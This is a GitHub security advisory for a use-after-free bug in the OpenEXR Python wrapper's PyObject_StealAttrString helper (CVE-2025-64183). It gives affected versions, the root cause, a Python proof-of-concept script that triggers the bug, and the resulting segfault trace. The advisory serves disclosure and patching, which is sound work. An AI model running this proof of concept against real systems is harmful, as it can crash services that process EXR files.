# [M] OpenEXR has use after free in PyObject_StealAttrString

## Summary
Severity: Medium
Advisory: GHSA-57cw-j6vp-2p9m
CVE: CVE-2025-64183
CWE: CWE-416
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-04-06
Source: https://github.com/advisories/GHSA-57cw-j6vp-2p9m
Type: github-advisory

## Affected
- PyPI: `OpenEXR` — affected >=3.2.0 <3.2.5
- PyPI: `OpenEXR` — affected >=3.3.0 <3.3.6
- PyPI: `OpenEXR` — affected >=3.4.0 <3.4.3

## Details
### Summary
There is a use-after-free in PyObject_StealAttrString of pyOpenEXR_old.cpp.

This bug was found with [ZeroPath](https://zeropath.com/?utm_source=joshua.hu).

### Details

The legacy adapter defines PyObject_StealAttrString that calls PyObject_GetAttrString to obtain a new reference, immediately decrefs it, and returns the pointer. Callers then pass this dangling pointer to APIs like PyLong_AsLong/PyFloat_AsDouble, resulting in a use-after-free. This is invoked in multiple places (e.g., reading PixelType.v, Box2i, V2f, etc.).

https://github.com/AcademySoftwareFoundation/openexr/blob/b3a19903db0672c63055023aa788e592b16ec3c5/src/wrappers/python/PyOpenEXR_old.cpp#L109-L115

https://github.com/AcademySoftwareFoundation/openexr/blob/b3a19903db0672c63055023aa788e592b16ec3c5/src/wrappers/python/PyOpenEXR_old.cpp#L380-L387

https://github.com/AcademySoftwareFoundation/openexr/blob/b3a19903db0672c63055023aa788e592b16ec3c5/src/wrappers/python/PyOpenEXR_old.cpp#L1258-L1286

### PoC

```py
import OpenEXR, Imath

# Any small EXR will do - use one from OpenEXR test images or any project file
path = "any_small.exr"

# Property returns a fresh temporary int subclass, so the buggy helper
# decrefs it to zero before passing it to PyLong_AsLong => UAF.
class FreshInt(int):
    def __new__(cls, v):
        return int.__new__(cls, v)
    def __del__(self):
        # stir the heap to make the UAF obvious under PYTHONMALLOC=debug
        _ = bytearray(1_000_000)

class PixelTypeProxy:
    @property
    def v(self):
        return FreshInt(Imath.PixelType.FLOAT)  # any small value is fine

f = OpenEXR.InputFile(path)
# channel() forces the wrapper to read pixel_type.v using the buggy helper
# which returns a dangling pointer
print("About to trigger UAF...")
f.channel("R", pixel_type=PixelTypeProxy())
print("If you get here without a crash, try again with AddressSanitizer.")
```
running

```shell
PYTHONMALLOC=debug PYTHONDEVMODE=1 python3 pt.py
```

```
About to trigger UAF...
Fatal Python error: Segmentation fault

Current thread 0x00000001f209a140 (most recent call first):
  File "/private/tmp/i/pt.py", line 24 in <module>

Current thread's C stack trace (most recent call first):
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at _Py_DumpStack+0x44 [0x1058c00f8]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at faulthandler_dump_c_stack+0x58 [0x1058d2f3c]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at faulthandler_fatal_error+0x160 [0x1058d2e00]
  Binary file "/usr/lib/system/libsystem_platform.dylib", at _sigtramp+0x38 [0x1841796a4]
  Binary file "/private/tmp/i/lib/python3.14/site-packages/OpenEXR.cpython-314-darwin.so", at _Z16init_OpenEXR_oldP7_object+0x1010 [0x105cb9e94]
  Binary file "/private/tmp/i/lib/python3.14/site-packages/OpenEXR.cpython-314-darwin.so", at _Z16init_OpenEXR_oldP7_object+0x1010 [0x105cb9e94]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at method_vectorcall_VARARGS_KEYWORDS+0x94 [0x1057032bc]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at PyObject_Vectorcall+0x58 [0x1056f5044]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at _PyEval_EvalFrameDefault+0x9cac [0x1058312d8]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at PyEval_EvalCode+0xf8 [0x105827130]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at run_mod+0xac [0x1058a2b60]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at pyrun_file+0xa4 [0x1058a123c]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at _PyRun_SimpleFileObject+0x100 [0x1058a07c0]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at _PyRun_AnyFileObject+0x50 [0x1058a0424]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at pymain_run_file_obj+0xa4 [0x1058cfcd8]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at pymain_run_file+0x48 [0x1058cfa20]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at Py_RunMain+0x354 [0x1058cef60]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at pymain_main+0xe8 [0x1058cf3f8]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at Py_BytesMain+0x28 [0x1058cf494]
  Binary file "/usr/lib/dyld", at start+0x17bc [0x183d9eb98]

Extension modules: numpy._core._multiarray_umath, numpy.linalg._umath_linalg (total: 2)
Segmentation fault: 11     PYTHONMALLOC=debug PYTHONDEVMODE=1 python3 pt.py
```

### Impact

Completely depends on the context. Typical memory stuff related to UAFs.

## References
- https://github.com/AcademySoftwareFoundation/openexr/security/advisories/GHSA-57cw-j6vp-2p9m
- https://nvd.nist.gov/vuln/detail/CVE-2025-64183
- https://github.com/AcademySoftwareFoundation/openexr
- https://github.com/AcademySoftwareFoundation/openexr/blob/b3a19903db0672c63055023aa788e592b16ec3c5/src/wrappers/python/PyOpenEXR_old.cpp#L109-L115
